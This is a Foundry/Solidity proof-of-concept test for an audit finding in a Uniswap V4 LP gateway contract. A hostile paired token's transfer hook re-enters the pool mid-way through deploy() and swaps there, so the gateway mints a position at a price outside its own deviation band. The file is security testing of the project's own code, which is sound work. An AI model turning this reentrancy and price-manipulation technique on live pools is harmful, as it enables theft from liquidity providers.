// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IPositionManager} from "@uniswap/v4-periphery/src/interfaces/IPositionManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {ModifyLiquidityParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolModifyLiquidityTest} from "@uniswap/v4-core/src/test/PoolModifyLiquidityTest.sol";

import {MintwareLpGatewayStaging} from "../../src/gateway/MintwareLpGatewayStaging.sol";
import {MintwareLpGatewayPositionManager, IPermit2Minimal} from "../../src/gateway/MintwareLpGatewayPositionManager.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {MockERC4626} from "../mocks/MockERC4626.sol";
import {MintwareERC4626YieldAdapter} from "../../src/vaults/MintwareERC4626YieldAdapter.sol";
import {MaliciousReentrantPairedToken} from "../mocks/MaliciousReentrantPairedToken.sol";

/// @notice PoC — HIGH: `deploy()`'s post-first-swap price re-read (MintwareLpGatewayPositionManager.sol:772)
///         is never re-checked against the deviation band, so a hostile paired-token transfer hook can
///         interleave its OWN unbounded swap against the same pool (V4's `onlyWhenUnlocked` gate is a
///         single global boolean, not caller-scoped — PoolManager.sol lines 96-97/187-227/291-297) mid-way
///         through `deploy()`'s own bounded swap, and `deploy()` mints its LP position off that manipulated
///         price with no re-check.
///
///         Real V4 stack (not the `MockSlot0PoolManager` stub) — SELF-SKIPS when `LP_FORK_RPC_URL` is unset,
///         mirroring `MintwareLpGatewayHardeningFork.t.sol`.
///
///         Run:  LP_FORK_RPC_URL=https://rpc.testnet.chain.robinhood.com \
///               forge test --match-contract MintwareLpGatewayDeployReentrancyFork -vvvv
contract MintwareLpGatewayDeployReentrancyForkTest is Test {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    address constant RH_POOL_MANAGER = 0x8366a39CC670B4001A1121B8F6A443A643e40951;
    address constant RH_POSITION_MANAGER = 0x58daec3116aae6D93017bAAea7749052E8a04fA7;
    address constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    uint160 constant SQRT_1 = 79228162514264337593543950336; // price 1.0 (tick 0)
    uint16 constant MAX_DEVIATION_BPS = 500; // 5%, same default the rest of the suite uses

    bool internal live;
    IPoolManager internal poolManager;
    MintwareLpGatewayStaging internal staging;
    MintwareLpGatewayPositionManager internal pm;
    MockERC20 internal quote; // 18dp gateway quote asset
    MaliciousReentrantPairedToken internal malicious; // the hostile paired asset
    PoolKey internal key;
    bool internal quoteIsCurrency0;
    PoolModifyLiquidityTest internal seeder;
    MintwareERC4626YieldAdapter internal adapter;
    MockERC4626 internal yieldSource;

    address internal RECIP = address(0xFEE5);
    address internal alice = address(0xA11CE);
    address internal seederLp = address(0x5EED);
    int24 internal constant TL = -22980;
    int24 internal constant TU = 22980;

    function setUp() public {
        string memory rpc = vm.envOr("LP_FORK_RPC_URL", string(""));
        if (bytes(rpc).length == 0) {
            live = false;
            return;
        }
        vm.createSelectFork(rpc);
        live = true;

        poolManager = IPoolManager(vm.envOr("LP_POOL_MANAGER", RH_POOL_MANAGER));
        IPositionManager posm = IPositionManager(vm.envOr("LP_POSITION_MANAGER", RH_POSITION_MANAGER));

        quote = new MockERC20("Quote", "Q", 18);
        malicious = new MaliciousReentrantPairedToken(address(poolManager));

        (address c0, address c1) = address(quote) < address(malicious) ? (address(quote), address(malicious)) : (address(malicious), address(quote));
        quoteIsCurrency0 = c0 == address(quote);
        key = PoolKey({
            currency0: Currency.wrap(c0),
            currency1: Currency.wrap(c1),
            fee: 3000,
            tickSpacing: 60,
            hooks: IHooks(address(0))
        });
        poolManager.initialize(key, SQRT_1);

        yieldSource = new MockERC4626(IERC20(address(quote)));
        adapter = new MintwareERC4626YieldAdapter(address(quote), address(yieldSource), address(0), address(this));
        staging = new MintwareLpGatewayStaging(IERC20(address(quote)), adapter);
        adapter.setVault(address(staging));

        pm = new MintwareLpGatewayPositionManager(
            poolManager, posm, IPermit2Minimal(PERMIT2), key, IERC20(address(quote)), TL, TU, staging, address(this),
            RECIP, MAX_DEVIATION_BPS, type(uint256).max
        );
        staging.setController(address(pm));

        // Seed deep third-party liquidity — the "existing, curated, already-liquid pool" the gateway only
        // ever targets. Far above anything either swap in this test moves, so the seed itself never binds.
        seeder = new PoolModifyLiquidityTest(poolManager);
        quote.mint(seederLp, 10_000_000e18);
        malicious.mint(seederLp, 10_000_000e18);
        vm.startPrank(seederLp);
        quote.approve(address(seeder), type(uint256).max);
        malicious.approve(address(seeder), type(uint256).max);
        seeder.modifyLiquidity(
            key,
            ModifyLiquidityParams({tickLower: TL - key.tickSpacing, tickUpper: TU + key.tickSpacing, liquidityDelta: 10_000_000e18, salt: bytes32(0)}),
            bytes("")
        );
        vm.stopPrank();

        quote.mint(alice, 1_000_000e18);
        vm.prank(alice);
        quote.approve(address(pm), type(uint256).max);
    }

    /// @notice The finding, end to end: a legit `deploy()` gets its OWN mint sized off a price the attacker
    ///         moved DURING that same call, with the deviation band never re-checked against it.
    function test_fork_HIGH_deployMintsOffPriceManipulatedMidSwap() public {
        if (!live) return;

        // 1) Pre-state: the follower reference is anchored at the pool's init price (1.0), and the ctor's
        //    band math is public — this IS the check `deploy()` runs on its OWN swap, once, before either
        //    swap happens.
        (uint160 refBefore,,) = pm.referencePrice();
        assertEq(refBefore, SQRT_1, "follower anchored at pool init price");
        uint160 band = uint160((uint256(refBefore) * pm.maxDeviationBps()) / 10_000);

        // 2) Fund + arm the hostile paired token. A real hostile token would mint/rebase itself this
        //    "attack capital" (it is, after all, the token's OWN contract); pre-funding it here is purely
        //    for test-harness clarity, not a required precondition for the exploit.
        uint256 attackAmountIn = 300_000e18; // dwarfs the legit 50k zap; the pool holds 10M in seeded depth
        quote.mint(address(malicious), attackAmountIn);
        malicious.configure(key, address(pm), IERC20(address(quote)), quoteIsCurrency0, attackAmountIn);

        vm.prank(alice);
        pm.deposit(100_000e18);

        malicious.arm(true);

        // 3) The ONLY call the gateway owner makes. Nothing here looks unusual: swap 50k of the staged 100k
        //    quote into the paired leg, mint a two-sided position with the rest. Everything below the
        //    surface — the interleaved swap, the manipulated re-read, the unguarded mint — happens INSIDE
        //    this single external call.
        pm.deploy(100_000e18, 50_000e18, 0, 0, block.timestamp);

        malicious.arm(false);

        // 4) Proof the interleaved swap actually ran mid-`deploy()`, not before or after it.
        assertTrue(malicious.fired(), "the hijacked _update() fired its own swap during deploy()'s take()");

        // 5) Proof `deploy()` did not revert and DID mint using the manipulated price: a position exists.
        assertTrue(pm.tokenId() != 0, "deploy() minted a position off the manipulated re-read");

        // 6) The undeniable part: read the SAME slot0 `deploy()` re-read at line 772 (post-both-swaps) and
        //    run the gateway's OWN band formula (the one it applied to the pre-swap price only) against it.
        //    It fails the gateway's own stated invariant, on the price the gateway actually used to size the
        //    mint — proving the band was never re-applied after the first swap.
        (uint160 sqrtAfter,,,) = poolManager.getSlot0(key.toId());
        uint160 diff = sqrtAfter > refBefore ? sqrtAfter - refBefore : refBefore - sqrtAfter;
        assertGt(diff, band, "post-swap price deploy() actually minted against breaches its OWN pre-swap band");

        // 7) Sanity: this is not a rounding-scale breach — the interleaved swap dwarfed the band, exactly as
        //     the attack path in the finding describes (an unbounded swap racing a bounded one).
        assertGt(diff, band * 2, "manipulation materially exceeds the band, not a marginal miss");
    }
}
